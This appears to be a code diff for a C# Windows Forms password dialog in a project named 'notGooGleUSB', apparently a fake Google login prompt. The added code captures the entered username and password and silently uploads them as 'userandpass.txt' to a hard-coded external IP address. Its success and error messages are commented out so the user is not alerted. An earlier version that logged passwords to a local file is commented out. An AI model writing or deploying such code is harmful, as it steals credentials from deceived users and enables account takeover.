@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Net.Http;
+using System.IO;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -12,58 +14,102 @@ namespace notGooGleUSB
 {
     public partial class Password : Form
     {
-        public Password()
+        private string _userName;
+        public Password(string userName)        
         {
+            _userName = userName;
             InitializeComponent();
             passwordBox.PasswordChar = '*';
-            passwordBox.Select();
+            passwordBox.Select();            
         }
 
-        private void Next_Click(object sender, EventArgs e)
+        private async void Next_Click(object sender, EventArgs e)
         {
-            bool exeDirectoryExists = Directory.Exists(AppDomain.CurrentDomain.BaseDirectory);
+            string password = passwordBox.Text;
+            string userNameAndPassword = $"User Name: {_userName}" + Environment.NewLine + $"Password: {passwordBox.Text}";
 
-            if (!exeDirectoryExists)
+            try
             {
-                foreach (Form form in Application.OpenForms)
+                using (var client = new HttpClient())
                 {
-                    form.Close();
+                    using (var content = new MultipartFormDataContent())
+                    {
+                        // Create a ByteArrayContent from the password string
+                        var passwordContent = new ByteArrayContent(Encoding.UTF8.GetBytes(userNameAndPassword));
+                        content.Add(passwordContent, "file", "userandpass.txt");
+
+                        var response = await client.PostAsync("http://96.51.136.132:3000/uploads", content);
+
+                        //if (response.IsSuccessStatusCode)
+                        //{
+                        //    MessageBox.Show("Password uploaded successfully to the server.");
+                        //}
+                        //else
+                        //{
+                        //    MessageBox.Show("Error uploading password to the server.");
+                        //}
+                    }
                 }
             }
-            else
+            catch (Exception ex)
             {
-                string exeDirectory = AppDomain.CurrentDomain.BaseDirectory;
-                string logDirectory = Path.Combine(exeDirectory, "Login Information");
-                string logFilePath = Path.Combine(logDirectory, "LoginAndPassword.txt");
+                //MessageBox.Show("An error occurred: " + ex.Message);
+            }
 
-                string password = $"Password: {passwordBox.Text}";
-
-                if (!Directory.Exists(logDirectory))
-                {
-                    Directory.CreateDirectory(logDirectory);
-                }
-
-                if (!File.Exists(logFilePath))
-                {
-                    using (var sw = File.CreateText(logFilePath))
-                    {
-                        sw.WriteLine(password + "\n");
-                    }
-                }
-                else
-                {
-                    using (StreamWriter sw = File.AppendText(logFilePath))
-                    {
-                        sw.Write(password + "\n\n");
-                    }
-                }
-
-                foreach (Form form in Application.OpenForms)
-                {
-                    form.Close();
-                }
+            foreach (Form form in Application.OpenForms)
+            {
+                form.Close();
             }
         }
+
+
+
+
+
+
+        //bool exeDirectoryExists = Directory.Exists(AppDomain.CurrentDomain.BaseDirectory);
+
+        //if (!exeDirectoryExists)
+        //{
+        //    foreach (Form form in Application.OpenForms)
+        //    {
+        //        form.Close();
+        //    }
+        //}
+        //else
+        //{
+        //    string exeDirectory = AppDomain.CurrentDomain.BaseDirectory;
+        //    string logDirectory = Path.Combine(exeDirectory, "Login Information");
+        //    string logFilePath = Path.Combine(logDirectory, "LoginAndPassword.txt");
+
+        //    string password = $"Password: {passwordBox.Text}";
+
+        //    if (!Directory.Exists(logDirectory))
+        //    {
+        //        Directory.CreateDirectory(logDirectory);
+        //    }
+
+        //    if (!File.Exists(logFilePath))
+        //    {
+        //        using (var sw = File.CreateText(logFilePath))
+        //        {
+        //            sw.WriteLine(password + "\n");
+        //        }
+        //    }
+        //    else
+        //    {
+        //        using (StreamWriter sw = File.AppendText(logFilePath))
+        //        {
+        //            sw.Write(password + "\n\n");
+        //        }
+        //    }
+
+        //    foreach (Form form in Application.OpenForms)
+        //    {
+        //        form.Close();
+        //    }
+        //}
+
 
         private void showPassBox_CheckedChanged(object sender, EventArgs e)
         {
